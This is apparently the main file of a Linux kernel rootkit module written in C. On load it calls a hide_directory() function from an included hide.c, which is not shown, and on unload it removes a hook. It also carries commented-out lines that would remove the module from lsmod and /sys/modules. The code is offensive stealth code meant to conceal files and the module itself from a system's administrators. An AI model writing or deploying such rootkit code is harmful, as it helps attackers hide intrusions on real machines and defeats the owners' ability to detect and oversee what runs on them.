#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#include "hide.c"

MODULE_LICENSE("GPL");


int init_module(void) {
	// remove module from lsmod and /sys/modules 
	
	// list_del_init(&__this_module.list);
 	// kobject_del(&THIS_MODULE->mkobj.kobj);
	
	

	hide_directory();
	return 0;
}


void cleanup_module(void) {
	remove_hook();
}